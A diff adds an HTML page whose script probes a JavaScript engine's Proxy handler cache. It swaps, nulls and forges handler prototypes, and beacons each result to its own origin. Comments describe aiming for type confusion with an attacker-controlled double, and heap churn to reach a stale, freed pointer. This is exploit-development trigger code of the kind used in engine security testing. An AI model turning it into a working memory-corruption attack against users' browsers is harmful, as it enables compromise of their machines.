@@ -1,0 +1,80 @@
+<!doctype html><meta charset="utf-8"><title>poly-proto proxy cache</title>
+<script>
+(function(){
+  var q = location.search;
+  function mark(tag){
+    var u = location.origin + '/beacon/PPC-' + tag + '?t=' + Date.now();
+    try { if (navigator.sendBeacon && navigator.sendBeacon(u)) return; } catch(e){}
+    try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(); } catch(e){}
+  }
+  function polyProto(){
+    function foo(){ class C { constructor(){ this._f = 42; } } return new C; }
+    for (var i=0;i<15;i++) foo();
+    return foo();
+  }
+  function tryGet(p){
+    try { return 'v:' + p.foo; } catch(e) { return 'e:' + e.name; }
+  }
+  mark('BOOT');
+  var proto1 = { get: function(){ return 'P1'; } };
+  var proto2 = { get: function(){ return 'P2'; } };
+  var h = polyProto();
+  Object.setPrototypeOf(h, proto1);
+  var p = new Proxy({}, h);
+  mark('R1=' + tryGet(p));
+  Object.setPrototypeOf(h, proto2);
+  mark('R2=' + tryGet(p));
+  var h2 = polyProto();
+  Object.setPrototypeOf(h2, proto1);
+  var p2 = new Proxy({}, h2);
+  mark('S1=' + tryGet(p2));
+  Object.setPrototypeOf(h2, null);
+  mark('S2=' + tryGet(p2));
+  Object.setPrototypeOf(h2, proto2);
+  mark('S3=' + tryGet(p2));
+  // own trap then remove it
+  var h3 = polyProto();
+  Object.setPrototypeOf(h3, proto1);
+  var p3 = new Proxy({}, h3);
+  mark('T1=' + tryGet(p3));
+  h3.get = function(){ return 'OWN'; };
+  mark('T2=' + tryGet(p3));
+  delete h3.get;
+  mark('T3=' + tryGet(p3));
+  Object.setPrototypeOf(h3, null);
+  mark('T4=' + tryGet(p3));
+  // Variant C: the handler is itself a Proxy whose getPrototypeOf returns a
+  // primitive. If a cache path treats the handler's prototype as a cell, the
+  // payload here is a double the exploit controls.
+  function variantC(val, tag){
+    var inner = polyProto();
+    Object.setPrototypeOf(inner, proto1);
+    var prov = new Proxy(inner, { getPrototypeOf: function(){ return val; } });
+    var pp;
+    try { pp = new Proxy({}, prov); } catch(e){ mark(tag + '-ctor:' + e.name); return; }
+    mark(tag + '=' + tryGet(pp));
+  }
+  variantC(1.5, 'C1');
+  variantC(1.1, 'C2');
+  variantC('str', 'C3');
+  variantC(null, 'C4');
+  // Variant D: drop the prototype then churn the heap, so a stale cached
+  // pointer has a chance of pointing into freed memory.
+  (function(){
+    var keep = [];
+    for (var i=0;i<64;i++){
+      var hh = polyProto();
+      var pr = { get: function(){ return 'D' + i; } };
+      Object.setPrototypeOf(hh, pr);
+      keep.push(new Proxy({}, hh), hh);
+      if (i % 8 === 7) { Object.setPrototypeOf(hh, null); }
+    }
+    mark('D-built=' + keep.length);
+    for (var j=0;j<40;j++){ var big = new Array(20000).fill(j); if (j===39) mark('D-churn=' + big.length); }
+    var alive = 0;
+    for (var k=0;k<keep.length;k++){ try { var x = keep[k].foo; if (x !== undefined) alive++; } catch(e){} }
+    mark('D-after=' + alive);
+  })();
+  mark('ALIVE');
+})();
+</script>
